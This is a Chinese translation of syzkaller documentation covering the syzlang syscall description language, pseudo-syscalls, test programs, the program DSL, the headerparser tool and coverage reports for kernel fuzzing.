使用意料之外的/未声明的值当指定整数/字符串标志或整数字段时，只坚持使用官方的预期值。 通常情况下，bug是由意外的输入触发的。考虑到这一点，在描述中引入一些意想不到的值（例如-1或INT_MAX）可能太诱人了。这是不被鼓励的，有几个原因。首先，这是一个跨领域的问题，这些特殊的意外值仅仅适用于任何标志和整数领域。手动指定它们数千次是不可扩展的，也是不可维护的。第二，模糊器很难想出正确的复杂的系统调用序列，而描述是为了帮助解决这个问题。想出出乎意料的整数值很容易，模糊器在这里不需要帮助。总的来说，我们的想法是改进通用的fuzzer逻辑，以更好地处理这些情况，这将有助于所有的描述，而不是对每个单独的整数单独进行过度的专门化。Fuzzer已经有几个技巧来处理这个问题，例如，比较操作数值的拦截和典型的魔法值列表。 注意：标志的一些值可能只是作为一种疏忽而没有记录。这些值应该被添加到描述中。 Flags/enums标志类型用于所有的： 相互排斥的值的集合，其中只应选择其中一个（像C枚举）。 位标志的集合，其中多个值可以用位向OR结合起来（像mmap标志）。 上述的任何组合。 模糊器有区分枚举和位标志的逻辑，并产生相应的值。因此，一般的指导原则是只列举标志中的有意义的值，而不添加任何 “特殊 “值来 “帮助 “当前的模糊器逻辑。当/如果模糊器的逻辑发生变化/改进时，这些手动添加的东西可能变得没有必要，或者更糟糕的是，干扰模糊器生成良好值的能力。 定义顺序syzlang不要求在使用前声明实体（像C/C++那样），实体可以引用后来声明的实体（像Go那样）。建议按照重要性的顺序来声明东西，这样读者就能先看到最重要的东西，然后再进行越来越细的实现细节。例如，系统调用通常应该放在这些系统调用中使用的标志声明之前。注意：这种顺序通常与C语言中的声明方式完全相反：最不重要的东西放在前面。 汇编的内部结构将文本的系统调用描述编译成机器可使用的形式，由syzkaller实际生成程序，这个过程包括两个步骤： 第一步是使用syz-extract工具从内核源中提取符号常量值。syz-extract生成一个小的C程序，包括由include指令引用的内核头文件，定义由define指令指定的宏，并打印出符号常量值。结果存储在.const文件中，每个内核有一个。例如，sys/linux/dev_ptmx.txt被翻译成sys/linux/dev_ptmx.txt.const。 第二步是使用syz-sysgen工具将描述翻译成Go代码（实际的编译器代码存在于pkg/ast和pkg/compiler中）。这一步使用系统调用描述和第一步中生成的const文件，并产生prog/types.go中定义的Syscall和Type类型的实例化。你可以在sys/akaros/gen/amd64.go中看到一个Akaros的编译器输出的例子。这一步还为Executor/syscalls.h中的C++代码生成了一些最小的Syscall元数据。 非主线子系统make extract可以提取所有*.txt文件和所有支持的架构的常量。对于那些不存在于主线内核中的子系统，或者如果你有本地内核编译器的问题，这可能不起作用。在这种情况下，make extract使用的syz-extract工具可以手动运行单个文件/架构。 1234make bin/syz-extractbin/syz-extract -os linux -arch $ARCH -sourcedir $KSRC -builddir $LINUXBLD &lt;new&gt;.txtmake generatemake $ARCH是amd64, 386, arm64, arm, ppc64le, mips64le中的一种。如果子系统在几个架构上都支持，那么为每个架构运行syz-extract。$LINUX应该指向内核源码检出，它是为相应的arch配置的（也就是说，你需要先在那里运行make ARCH=arch someconfig &amp;&amp; make ARCH=arch，如果需要，记得添加CROSS_COMPILE=arm-linux-gnueabi-/aarch64-linux-gnu-/powerpc64le-linux-gnu-）。如果内核被建立在一个单独的目录中（用make O=output_dir，记得把.config放到output_dir，如果你想同时在不同的arch上工作，这将很有帮助），那么也要把$LINUXBLD设置为建立目录的位置。 测试描述描述本身可能包含错误。在用新的描述运行syz-manager后，检查syz-manager网页界面上的内核代码覆盖率报告总是很有用的。该报告可以评估我们期望覆盖的东西是否真的被覆盖了，如果没有，那么模糊器就会卡在哪里。然而，这只是对描述正确性的一个有用但相当间接的评估。模糊器可以通过偏离描述的内容来解决描述中的一些错误，但这将大大增加模糊器的进展难度。 存储在sys/OS/test/*中的测试对描述提供了更直接的测试。每个测试只是一个带有检查的系统调用返回值的程序。这里简要介绍了程序的语法。你也可以看一下现有的例子和程序反序列化代码。AUTO关键字可以作为常量和指针的值，对于指针来说，它将导致一些合理的内存地址的顺序分配。 至少为子系统的 “主要成功场景 “添加一个测试总是好的。它将确保描述确实是正确的，并且模糊器有可能得出成功的方案。请看io_uring测试作为一个很好的例子。 测试可以用syz-runtest工具运行，如： 1make runtest &amp;&amp; bin/syz-runtest -config manager.config syz-runtest启动多个虚拟机并在虚拟机内以不同的执行模式运行这些测试。 然而，完整的syz-runtest运行需要时间，所以在开发测试的同时，使用syz-execprog工具来运行它更方便。要运行测试，请将syz-execprog、syz-executor和测试复制到一个手动启动的虚拟机中，然后在虚拟机中运行以下命令： 1syz-execprog -debug -threaded=0 mytest 它将显示所有执行的系统调用的结果。它对于手动调试伪系统调用代码也很方便：如果你在伪系统调用中加入一些临时性的调试调用，syz-execprog -debug会显示它们的输出。 测试的语法可以通过下面的方式来检查： 1go test -run=TestParsing ./pkg/runtest Syscall 描述语言也叫 syzlang 。 系统调用描述的伪代码语法： 12345678syscallname &quot;(&quot; [arg [&quot;,&quot; arg]*] &quot;)&quot; [type] [&quot;(&quot; attribute* &quot;)&quot;]arg = argname typeargname = identifiertype = typename [ &quot;[&quot; type-options &quot;]&quot; ]typename = &quot;const&quot; | &quot;intN&quot; | &quot;intptr&quot; | &quot;flags&quot; | &quot;array&quot; | &quot;ptr&quot; | &quot;string&quot; | &quot;strconst&quot; | &quot;filename&quot; | &quot;glob&quot; | &quot;len&quot; | &quot;bytesize&quot; | &quot;bytesizeN&quot; | &quot;bitsize&quot; | &quot;vma&quot; | &quot;proc&quot;type-options = [type-opt [&quot;,&quot; type-opt]] 常见的类型选项包括： 1&quot;opt&quot; - the argument is optional (like mmap fd argument, or accept peer argument) 其余类型选项是特定于类型的： 12345678910111213141516171819202122232425262728293031323334353637383940414243&quot;const&quot;: integer constant, type-options: value, underlying type (one of &quot;intN&quot;, &quot;intptr&quot;)&quot;intN&quot;/&quot;intptr&quot;: an integer without a particular meaning, type-options: optional range of values (e.g. &quot;5:10&quot;, or &quot;100:200&quot;), optionally followed by an alignment parameter&quot;flags&quot;: a set of values, type-options: reference to flags description (see below), underlying int type (e.g. &quot;int32&quot;)&quot;array&quot;: a variable/fixed-length array, type-options: type of elements, optional size (fixed &quot;5&quot;, or ranged &quot;5:10&quot;, boundaries inclusive)&quot;ptr&quot;/&quot;ptr64&quot;: a pointer to an object, type-options: direction (in/out/inout); type of the object ptr64 has size of 8 bytes regardless of target pointer size&quot;string&quot;: a zero-terminated memory buffer (no pointer indirection implied), type-options: either a string value in quotes for constant strings (e.g. &quot;foo&quot; or `deadbeef` for hex literal), or a reference to string flags (special value `filename` produces file names), optionally followed by a buffer size (string values will be padded with \\x00 to that size)&quot;stringnoz&quot;: a non-zero-terminated memory buffer (no pointer indirection implied), type-options: either a string value in quotes for constant strings (e.g. &quot;foo&quot; or `deadbeef` for hex literal), or a reference to string flags,&quot;glob&quot;: glob pattern to match on the target files, type-options: a pattern string in quotes (syntax: https://golang.org/pkg/path/filepath/#Match) (e.g. &quot;/sys/&quot; or &quot;/sys/**/*&quot;), or include exclude glob too (e.g. &quot;/sys/**/*:-/sys/power/state&quot;)&quot;fmt&quot;: a string representation of an integer (not zero-terminated), type-options: format (one of &quot;dec&quot;, &quot;hex&quot;, &quot;oct&quot;) and the value (a resource, int, flags, const or proc) the resulting data is always fixed-size (formatted as &quot;%020llu&quot;, &quot;0x%016llx&quot; or &quot;%023llo&quot;, respectively)&quot;len&quot;: length of another field (for array it is number of elements), type-options: argname of the object&quot;bytesize&quot;: similar to &quot;len&quot;, but always denotes the size in bytes, type-options: argname of the object&quot;bitsize&quot;: similar to &quot;len&quot;, but always denotes the size in bits, type-options: argname of the object&quot;offsetof&quot;: offset of the field from the beginning of the parent struct, type-options: field&quot;vma&quot;/&quot;vma64&quot;: a pointer to a set of pages (used as input for mmap/munmap/mremap/madvise), type-options: optional number of pages (e.g. vma[7]), or a range of pages (e.g. vma[2-4]) vma64 has size of 8 bytes regardless of target pointer size&quot;proc&quot;: per process int (see description below), type-options: value range start, how many values per process, underlying type&quot;text&quot;: machine code of the specified type, type-options: text type (x86_real, x86_16, x86_32, x86_64, arm64)&quot;void&quot;: type with static size 0 mostly useful inside of templates and varlen unions, can't be syscall argument 当在structs/unions/pointers中使用时，flags/len/flags也有尾部的底层类型type-option。 标志描述为： 1flagname = const [&quot;,&quot; const]* 或字符串标志为： 1flagname = &quot;\\&quot;&quot; literal &quot;\\&quot;&quot; [&quot;,&quot; &quot;\\&quot;&quot; literal &quot;\\&quot;&quot;]* 调用属性为： 12345&quot;disabled&quot;: 调用将不会被用于模糊测试；对于临时禁用某些调用或禁止某些参数组合来说是非常有用的。或禁止特定的参数组合。&quot;timeout[N]&quot;: 在一些默认值的基础上，调用的额外执行超时（ms）。&quot;prog_timeout[N]&quot;: 额外的执行超时（ms），如果整个程序包含这个调用。如果一个程序包含几个这样的调用，则使用最大值。&quot;ignore_return&quot;: 在fallback feedback中忽略该系统调用的返回值；需要用于那些不返回固定错误代码而是返回其他东西（如当前时间）的调用。&quot;breaks_returns&quot;: 在fallback feedback中忽略程序中所有后续调用的返回值（不能被信任）。 整数int8, int16,int32和int64表示相应大小的整数。 intptr表示指针大小的整数，即C的long类型。加be后缀（例如int16be），表示大端。可以为一个整数指定一个值的范围，格式为int32[0:100]或int32[0:4096, 512]（表示512对齐的int）。用int64:N来表示一个大小为N的位域。 可以将这些不同类型的整数用作const、flags和len的基本类型proc。 1234567example_struct { f0 int8 # random 1-byte integer f1 const[0x42, int16be] # const 2-byte integer with value 0x4200 (big-endian 0x42) f2 int32[0:100] # random 4-byte integer with values from 0 to 100 inclusive f3 int32[1:10, 2] # random 4-byte integer with values {1, 3, 5, 7, 9} f4 int64:20 # random 20-bit bitfield} Struct结构描述为： 123structname &quot;{&quot; &quot;\\n&quot; (fieldname type (&quot;(&quot; fieldattribute* &quot;)&quot;)? &quot;\\n&quot;)+&quot;}&quot; (&quot;[&quot; attribute* &quot;]&quot;)? 可以在字段后面的括号中指定属性，与它们的类型无关。in/out/inout属性指定每个字段的方向，例如： 12345foo { field0 const[1, int32] (in) field1 int32 (inout) field2 fd (out)} out_overlay属性允许对结构进行单独的输入和输出布局。out_overlay字段之前的字段为输入，从out_overlay开始的字段为输出。输入和输出字段在内存中重叠（都是从内存中的结构开始）。如： 1234567foo { in0 const[1, int32] in1 flags[bar, int8] in2 ptr[in, string] out0 fd (out_overlay) out1 int32} 结构体可以在结构体后的方括号中指定属性。属性是： packed: 这个结构在字段之间没有填充物，并且有对齐方式1；这类似于GNU C __attribute__((packed))；结构的对齐方式可以用align属性覆盖。 align[N]: 这个结构的对齐方式是N，并且填充物是N的倍数；填充物的内容没有指定（不过经常是零）；类似于GNU C __attribute__((aligned(N)) size[N]: 结构被填充到指定的大小N；填充的内容没有指定（尽管经常是零）。 Union描述为： 123unionname &quot;[&quot; &quot;\\n&quot; (fieldname type &quot;\\n&quot;)+&quot;]&quot; (&quot;[&quot; attribute* &quot;]&quot;)? 可以在Union之后的方括号中指定属性。属性是： varlen：联合体的大小是所选择的特定选项的大小（不是静态的）；如果没有这个属性，联合体的大小是所有选项的最大值（类似于C的联合体）。 size[N]: 联合体被填充到指定的大小N；填充的内容未被指定（不过，经常是零）。 Resource资源代表需要从一个系统调用的输出传递到另一个系统调用的输入的值。例如，close系统调用需要一个先前由open或pipe系统调用返回的输入值（fd）。为了实现这一点，fd被声明为一种资源。这是一种模拟系统调用之间依赖关系的方式，因为将一个系统调用定义为资源的生产者，将另一个系统调用定义为消费者，在它们之间定义了一种松散的排序。资源被描述为： 1&quot;resource&quot; identifier &quot;[&quot; underlying_type &quot;]&quot; [ &quot;:&quot; const (&quot;,&quot; const)* ] underlying_type是int8、int16、int32、int64、intptr中的一种，或者是另一种资源（它是继承的模型，例如，socket是fd的一个子类型）。可选的常量集代表资源的特殊值，例如，0xffffffffffffff(-1)代表 “没有fd”，或者AT_FDCWD代表 “当前dir”。特殊值作为资源值偶尔使用一次。如果没有指定特殊值，则使用特殊值0。然后，资源可以作为类型使用，例如： 1234567resource fd[int32]: 0xffffffffffffffff, AT_FDCWD, 1000000resource sock[fd]resource sock_unix[sock]socket(...) sockaccept(fd sock, ...) socklisten(fd sock, backlog int32) 资源不一定要由系统调用返回。它们可以像其他任何数据类型一样被使用。比如说： 123456789resource my_resource[int32]request_producer(..., arg ptr[out, my_resource])request_consumer(..., arg ptr[inout, test_struct])test_struct { ... attr my_resource} 对于更复杂的生产者/消费者的情况，可以利用字段属性。比如说： 12345678910resource my_resource_1[int32]resource my_resource_2[int32]request_produce1_consume2(..., arg ptr[inout, test_struct])test_struct { ... field0 my_resource_1 (out) field1 my_resource_2 (in)} 每种资源类型必须被至少一个系统调用 “生产”（作为输出）（在联合和可选指针之外）和被至少一个系统调用 “消费”（作为输入）。 类型别名使用以下语法为经常重复的复杂类型赋予短类型别名： 1type identifier underlying_type 例如： 12type signalno int32[0:65]type net_port proc[20000, 4, int16be] 然后，在任何情况下都可以使用类型别名来代替基础类型。底层类型需要像描述一个结构字段一样描述，也就是说，如果需要的话，可以使用底层类型。但是，类型别名也可以用作系统调用参数。底层类型目前仅限于整数类型const、 proc、flags、ptr和ptr64类型。 有一些内置类型别名： 1234567891011type bool8 int8[0:1]type bool16 int16[0:1]type bool32 int32[0:1]type bool64 int64[0:1]type boolptr intptr[0:1]type fileoff[BASE] BASEtype filename string[filename]type buffer[DIR] ptr[DIR, array[int8]] 类型模板类型模板可以声明如下： 1234567type buffer[DIR] ptr[DIR, array[int8]]type fileoff[BASE] BASEtype nlattr[TYPE, PAYLOAD] { nla_len len[parent, int16] nla_type const[TYPE, int16] payload PAYLOAD} [align_4] 后来使用如下： 1syscall(a buffer[in], b fileoff[int64], c ptr[in, nlattr[FOO, int32]]) 内置类型模板optional定义为： 1234type optional[T] [ val T void void] [varlen] 长度你可以通过使用len、bytesize和bitsize等类型来指定结构中的特定字段或命名参数的长度，例如： 123456write(fd fd, buf ptr[in, array[int8]], count len[buf])sock_fprog { len len[filter, int16] filter ptr[in, array[sock_filter]]} 如果len的参数是指针，则使用指针参数的长度。 用bytesizeN来表示一个字段的长度，N的可能值是1、2、4和8。 要表示父结构的长度，可以使用len[parent, int8]。当结构被嵌入到另一个结构中时，为了表示上一级父结构的长度，可以指定特定父结构的类型名称： 123456789s1 { f0 len[s2] # length of s2}s2 { f0 s1 f1 array[int32] f2 len[parent, int32]} len参数也可以是一个路径表达式，允许更复杂的寻址。路径表达式类似于C语言的字段引用，但也允许引用父级和同级元素。在路径的开头使用一个特殊的引用系统调用，允许直接引用系统调用的参数。例如： 123456789101112131415161718192021222324252627s1 { a ptr[in, s2] b ptr[in, s3] c array[int8]}s2 { d array[int8]}s3 {# This refers to the array c in the parent s1. e len[s1:c, int32]# This refers to the array d in the sibling s2. f len[s1:a:d, int32]# This refers to the array k in the child s4. g len[i:j, int32]# This refers to syscall argument l. h len[syscall:l, int32] i ptr[in, s4]}s4 { j array[int8]}foo(k ptr[in, s1], l ptr[in, array[int8]]) Procproc类型可以用来表示每个进程的整数。我们的想法是为每个执行者提供一个单独的数值范围，这样他们就不会相互干扰。 最简单的例子是一个端口号。proc[20000, 4, int16be]类型意味着我们要从20000开始生成一个int16be整数，并为每个进程分配4个值。因此，执行者编号n将得到[20000 + n * 4, 20000 + (n + 1) * 4]范围内的值。 整数常量整数常量可以指定为十进制常量、0x前缀十六进制常量、'字符常量或从内核头文件中提取或由define指令定义的符号常量。例如： 123456foo(a const[10], b const[-10])foo(a const[0xabcd])foo(a int8['a':'z'])foo(a const[PATH_MAX])foo(a ptr[in, array[int8, MY_PATH_MAX]])define MY_PATH_MAX PATH_MAX + 2 杂项描述文件还包含include引用 Linux 内核头文件的 incdir指令、引用自定义 Linux 内核头目录的define指令和定义符号常量值的指令。 syzkaller 执行器定义了一些伪系统调用 ，可以用作描述文件中的任何其他系统调用。这些伪系统调用扩展为文字 C 代码，并且可以执行用户定义的自定义操作。可以在executor/common_linux.h中找到一些示例 。关于如何写好一个描述文件可以参考这里。 伪系统调用除了常规系统调用，系统调用描述文件还可以包含伪系统调用。这些是在执行程序中定义的 C 函数。当测试程序使用伪系统调用时，执行器将在生成的 C 程序中生成伪系统调用函数代码。 这允许测试程序具有特定的代码块来执行某些操作，它们也可以用作原始系统调用的更易于测试的包装器。 通常不鼓励使用伪系统调用，因为它们破坏了声明性描述的所有优点（声明性、简洁性、对所有方面的模糊控制、对逻辑进行全局改进的可能性、静态检查、更少的错误等），增加了维护负担，是不可重复使用并使 C 复制器更长。但是，syzlang 的表达能力不足以涵盖所有可能的情况，因此需要根据具体情况考虑使用伪系统调用（额外的好处、代码量、扩展 syzlang 以涵盖这种情况的可能性等） 。 如何向执行程序添加伪系统调用首先，考虑伪系统调用的范围以及它将与哪些系统和子系统相关。执行器包括一组固定的 C 头文件，其中包含伪系统调用的代码。在创建新文件之前检查新文件是否适合现有文件之一。这些头文件在gen.go中定义： 12345678910111213141516executorFilenames := []string{ &quot;common_linux.h&quot;, &quot;common_akaros.h&quot;, &quot;common_bsd.h&quot;, &quot;common_fuchsia.h&quot;, &quot;common_windows.h&quot;, &quot;common_test.h&quot;, &quot;common_kvm_amd64.h&quot;, &quot;common_kvm_arm64.h&quot;, &quot;common_usb_linux.h&quot;, &quot;common_usb_netbsd.h&quot;, &quot;common_usb.h&quot;, &quot;android/android_seccomp.h&quot;, &quot;kvm.h&quot;, &quot;kvm_amd64.S.h&quot;,} 例如，如果我们的新伪系统调用是特定于 Linux 的，那么 common_linux.h将是放置它的地方。 实际的伪系统调用函数可能如下所示： 12345678#if SYZ_EXECUTOR || __NR_syz_mycall/* Add all the necessary #include and #define headers */static long syz_mycall(volatile long a0, volatile long a1){ /* Function body */}#endif 确保所有的函数要求都满足，并且可以编译。注意，函数名必须以 “syz_”开头。它也可以接受不同数量的参数。参数类型必须是volatile long，返回类型–long。long是必须的，以避免潜在的调用约定问题，因为它被投到了一个接受long的函数指针上。volatile的原因很有趣：很多libc函数都有各种参数约束的注释（例如，这个参数不应该是NULL，或者这个参数必须是有效的文件描述符）；C重现者可能会用常量参数调用这些函数，编译器可能会发现其中一些约束被违反了（例如，把NULL传给非NULL参数，或者把-1传成文件描述符），从而产生错误/警告。 volatile可以防止这种情况。 现在，为了正确处理伪系统调用，我们必须更新syscalls_linux.go中的isSupportedSyzkall，并为这个系统调用添加一个特殊情况，在必要时启用它。如果我们想无条件地启用它，我们可以简单地让isSupportedSyzkall返回true,&quot;&quot;。 12345func isSupportedSyzkall(sandbox string, c *prog.Syscall) (bool, string) { switch c.CallName { ... case &quot;syz_mycall&quot;: return true, &quot;&quot; 最后，运行make generate。现在您可以在系统调用描述文件中使用它，就像它是常规系统调用一样： 1syz_mycall(arg0 pid, arg1 const[0]) 外部依赖实现不得使用任何外部库或外部头文件，除了最基本和标准的（如&lt;unistd.h&gt;和 &lt;sys/mman.h&gt;）。特别是，它不能依赖于附加软件包安装的库/头文件，也不能依赖于最近添加的内核子系统的头文件。外部依赖已被证明是脆弱的并且很容易导致构建损坏，因为在 fuzzer 和任何 C 复制器上的任何构建/运行都需要所有依赖。例如，某些发行版上可能缺少包/头文件、名称不同、版本错误、损坏或与其他头文件冲突。不幸的是，没有办法可靠地为 C 程序指定此类依赖项和要求。因此，如果伪系统调用需要定义某些结构、常量或辅助函数，则应在执行程序代码本身中尽可能少地描述这些内容（它们将成为 C 复制器的一部分）。 测试每个新的伪系统调用应该在·sys/OS/test·中至少有一个测试。参见Linux测试的例子。一个测试只是一个带有检查系统调用返回值的程序。至少应该有一个测试，包含使用伪系统调用的 “主要成功场景”。请看io_uring测试作为一个很好的例子。这样的测试很重要，因为它们可以确保伪系统调用代码不包含 “愚蠢 “的bug（例如，每次在NULL-deref时崩溃），确保fuzzer有可能想出成功的场景（作为伪系统调用和周围描述的组合），并确保它在未来继续工作。关于测试的细节，请参见描述的测试。 普罗米修斯指标syz-manager的指标在http端点的URI /metrics上公开。目前从管理器导出的普罗米修斯指标是syz_exec_total、syz_corpus_cover和syz_crash_total。 这些指标可以通过以下的普罗米修斯客户端配置来摄取： 123456scrape_configs:- job_name: syzkaller scrape_interval: 10s static_configs: - targets: - localhost:56741 在syz-manager重启时，这些值被重置为零，只反映在当前执行的syz-manager中。 程序语法Syzkaller使用一种紧凑的特定领域语言（DSL）来记录已执行的程序，测试其代码，并在语料库中持久保存程序。本页提供了相应语法的简要描述。一些有用的信息也可以在现有的例子和程序反序列化代码中找到。 与执行选项一起，DSL提供了syz-executor运行程序所需的一切。例如： 123r0 = syz_open_dev$loop(&amp;(0x7f00000011c0), 0x0, 0x0)r1 = openat$6lowpan_control(0xffffffffffffff9c, &amp;(0x7f00000000c0), 0x2, 0x0)ioctl$LOOP_SET_FD(r0, 0x4c00, r1) 这个程序中的每一行都描述了一个特定的系统调用，前两次调用将结果保存在临时变量r0和r1中，这些变量被传递给第三个函数调用。 1234567891011121314151617line = assignment | callassignment = variable &quot; = &quot; callcall = syscall-name &quot;(&quot; [arg [&quot;,&quot; arg]*] &quot;)&quot; [&quot;(&quot; [call-prop [&quot;,&quot; call-prop*] &quot;)&quot;]arg = &quot;nil&quot; | &quot;AUTO&quot; | const-arg | resource-arg | result-arg | pointer-arg | string-arg | struct-arg | array-arg | union-argconst-arg = &quot;0x&quot; hex-integerresource-arg = variable [&quot;/&quot; hex-integer] [&quot;+&quot; hex-integer]result-arg = &quot;&lt;&quot; variable &quot;=&gt;&quot; argpointer-arg = &quot;&amp;&quot; pointer-arg-addr [&quot;=ANY&quot;] &quot;=&quot; argpointer-arg-addr = &quot;AUTO&quot; | &quot;(&quot; pointer-addr [&quot;/&quot; region-size] &quot;)&quot;string-arg = &quot;'&quot; escaped-string &quot;'&quot; | &quot;\\&quot;&quot; escaped-string &quot;\\&quot;&quot;struct-arg = &quot;{&quot; [arg [&quot;,&quot; arg]*] &quot;}&quot;array-arg = &quot;[&quot; [arg [&quot;,&quot; arg]*] &quot;]&quot;union-arg = &quot;@&quot; field-name [&quot;=&quot; arg]call-prop = prop-name &quot;: &quot; prop-valuevariable = &quot;r&quot; dec-integerpointer-addr = hex-integerregion-size = hex-integer 也可以添加注释： 12345# Obtain a file handler0 = openat(0xffffffffffffff9c, &amp;AUTO='./file1\\x00', 0x42, 0x1ff)# Perform a write operationwrite(r0, &amp;AUTO=&quot;01010101&quot;, 0x4) 内存管理内存管理是由syzkaller本身执行的。它将分配必要大小的虚拟内存区域并设置指针参数的最终值。 通过使用AUTO关键字，程序可以让syzkaller完全控制数据的存储。这可能很方便，例如，当一个参数必须通过引用传递，但其值的确切位置并不特别重要。 12r1 = syz_genetlink_get_family_id$nl80211(&amp;AUTO='nl80211\\x00', 0xffffffffffffffff)ioctl$sock_SIOCGIFINDEX_80211(r0, 0x8933, &amp;AUTO={'wlan0\\x00', &lt;r2=&gt;0x0}) 另外，一些数据可以被 “锚定 “在特定的地址上。当一个内存区域必须在多个调用之间共享时，这可能特别重要。在这种情况下，指针地址必须在0x7f0000000000偏移处给出。在实际执行之前，syzkaller会将指针调整到实际mmaped区域的起点。 调用属性调用属性指定了关于必须如何执行一个特定调用的额外信息。一个程序中的每个调用都有自己的调用属性。如果没有提供属性，syzkaller会采用默认的属性。 目前，syzkaller支持以下调用属性。 故障注入语法： fail_nth: N。 它需要一个整数的参数N，如果该参数为非负数，则将在第N个场合注入一个故障。 12r0 = openat$6lowpan_control(0xffffffffffffff9c, &amp;(0x7f00000000c0), 0x2, 0x0)ioctl$LOOP_SET_FD(r0, 0x4c00, r0) (fail_nth: 5) Async语法： async。 指示syz-executor不要等到调用完成，立即进行下一个调用。 1234r0 = openat(0xffffffffffffff9c, &amp;AUTO='./file1\\x00', 0x42, 0x1ff)write(r0, &amp;AUTO=&quot;01010101&quot;, 0x4) (async)read(r0, &amp;AUTO=&quot;&quot;/4, 0x4)close(r0) 在设置 async 标志的时候要注意以下几点： 这样的程序只能在线程模式下执行（即syz-executor必须设置-threaded标志）。 每个async调用都在一个单独的线程中执行，而且可用的线程数量有限（kMaxThreads = 16）。 如果一个async调用产生了一个资源，其他的调用可能会把它作为输入，如果产生资源的调用到那时还没有完成，syz-executor将直接传0。 Headerparserheaderparser是一个协助syzkaller编写设备系统调用描述的工具。为了使syzkaller在对设备节点进行模糊处理时更加智能，你可以向它提供它所期望的ioctl参数结构类型的信息。为了减轻编写ioctl参数类型描述文件的工作量，headerlib会尽力为你生成这些文件。但仍然需要从描述语言的类型列表中手动选择合适的syzkaller数据类型。 依赖1$ pip install pycparser 使用12345678910$ python headerparser.py --filenames=./test_headers/th_b.hB { B1 len|fileoff|flags|intN #(unsigned long) B2 len|fileoff|flags|intN #(unsigned long)}struct_containing_union { something len|fileoff|flags|int32 #(int) a_union.a_char ptr[in|out, string]|ptr[in, filename] #(char*) a_union.B_ptr ptr|buffer|array #(struct B*)} 可以把结构元数据下面的内容复制粘贴到你的syzkaller设备描述上。 错误处理下面尝试解析test_headers/th_a.h头文件以生成参数结构： 123456789$ python headerparser.py --filenames=./test_headers/th_a.hERROR:root:HeaderFilePreprocessorException: /tmp/tmpW8xzty/source.o:36:2: before: some_type$ python headerparser.py --filenames=./test_headers/th_a.h --debugDEBUG:GlobalHierarchy:load_header_files : ['./test_headers/th_a.h']DEBUG:HeaderFilePreprocessor:HeaderFilePreprocessor._mktempfiles: sourcefile=/tmp/tmpbBQYhR/source.cobjectfile=/tmp/tmpbBQYhR/source.oDEBUG:HeaderFilePreprocessor:HeaderFilePreprocessor.execute: cp ./test_headers/th_a.h /tmp/tmpbBQYhRDEBUG:HeaderFilePreprocessor:HeaderFilePreprocessor.execute: gcc -I. -E -P -c /tmp/tmpbBQYhR/source.c &gt; /tmp/tmpbBQYhR/source.oERROR:root:HeaderFilePreprocessorException: /tmp/tmpbBQYhR/source.o:36:2: before: some_type 从错误信息中可以看到错误的发生是因为 pycparser 没有发现到 some_type 这个类型。我们可以通过让 pycparser 找到这个未知的类型来解决这个问题。因此，我们向 headerparser 提供了一个包含 C 声明和包含的文件，这些文件可以解决解析错误。 1234567891011$ cat &gt; include_filetypedef int some_type;$ python headerparser.py --filenames=./test_headers/th_a.h --include=./include_fileA { B_item ptr|buffer|array #(struct B*) char_ptr ptr[in|out, string]|ptr[in, filename] #(char*) an_unsigned_int len|fileoff|int32 #(unsigned int) a_bool _Bool #(_Bool) another_bool _Bool #(_Bool) var some_type #(some_type)} 执行syzkaller程序下面介绍如何执行现有的syzkaller程序以达到重现错误的目的。通过这种方式，你可以重放单个程序或者整个执行日志中的几个程序。 设置Go工具链。 下载syzkaller源码。 编译syzkaller。 将二进制文件和程序复制到测试机上。 在测试机上运行程序： 1./syz-execprog -repeat=0 -procs=8 program 如果设置了-threaded=0，程序将作为一个简单的单线程的系统调用序列来执行。-threaded=1强制在一个单独的线程中执行每个系统调用，这样就可以在阻塞的系统调用上进行执行。 如果重放的是一个包含标题的复制器程序，其内容大致如下： 1# {Threaded:true Repeat:true RepeatTimes:0 Procs:8 Slowdown:1 Sandbox:none Leak:false NetInjection:true NetDevices:true NetReset:true Cgroups:true BinfmtMisc:true CloseFDs:true KCSAN:false DevlinkPCI:false USB:true VhciInjection:true Wifi:true IEEE802154:true Sysctl:true UseTmpDir:true HandleSegv:true Repro:false Trace:false LegacyOptions:{Collide:false Fault:false FaultCall:0 FaultNth:0}} 根据头文件中的值来调整syz-execprog的标志。即，Threaded/Procs/Sandbox直接与-threaded/-procs/-sandbox的标志有关。如果Repeat设置为 &quot;true&quot;，则在syz-execprog中添加-repeat=0标志。 覆盖率syzkaller使用sanitizer和KCOV进行覆盖率收集。gcc也支持Sanitizer，其他一些操作系统也支持KCOV。注意：gVisor的覆盖率是完全不同的。 覆盖率是基于对编译器插入目标代码的覆盖点的追踪。覆盖点通常是指一个基本的代码块或一个CFG边（这取决于编译器和编译过程中使用的插桩模式，例如Linux和clang的默认模式是CFG边，而gcc的默认模式是基本块）。覆盖点是由编译器在大量的转换和优化过程后在中间插入的。因此，覆盖率可能与源代码没什么关系。 Web接口当点击cover时，会得到显示位于内核构建目录中的每个目录的视图。它显示的是N的X%或---。N的X%意味着到目前为止N个覆盖点中的X%被覆盖，---表示该目录中没有覆盖。 点击目录，可以看到文件和可能的子目录。在每一个源代码文件上都有---或覆盖率。 如果点击任何C文件，将看到源代码视图。在源代码视图中使用了一些颜色。颜色的定义可以在coverTemplate中找到。着色说明如下。 如果点击列出的源文件的百分比数字，将看到该源文件中每个函数的覆盖率。 Covered: black (#000000)所有与该行相关的PC值都包括在内。左边的数字表明有多少程序已经触发了执行与该行有关的PC值。你可以点击这个数字，它将打开最后执行的程序。下面的例子显示了完全覆盖的单行是如何显示的。 Both: orange (#c86400)有几个与该行相关的PC值，并不是所有这些都被执行。同样，在源代码的左边有一个数字，可以点击它来打开最后一个触发相关PC值的程序。下面的例子显示了一个单行，它有被执行和未执行的PC值与之相关。 Weak-uncovered: crimson red (#c80000)这一行所在的函数（符号）没有任何覆盖。也就是说，这个函数根本就没有被执行。如果编译器已经优化了某些符号，并使代码内联，那么与这一行相关的符号就是代码被编译的地方。这使得有时真的很难弄清着色的含义。下面的例子显示了与之相关的单行是如何被揭开的，而与之相关的PC值是在不被执行的函数中显示的。 Uncovered: red (#ff0000)下面的例子显示了未被覆盖的单行是如何显示的。 Not instrumented: grey (#505050)与该行相关的PC值没有被检测，或者源行根本没有生成代码。下面的例子显示了所有未检测的代码是如何显示的。 syz-cover在syzkaller资源库中，有一个小工具可以根据原始覆盖率数据生成覆盖率报告。 1GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w&quot; -o ./bin/syz-cover github.com/google/syzkaller/tools/syz-cover 原始覆盖数据可以通过运行syz-manager获得。 1wget http://localhost:&lt;your syz-manager port&gt;/rawcover 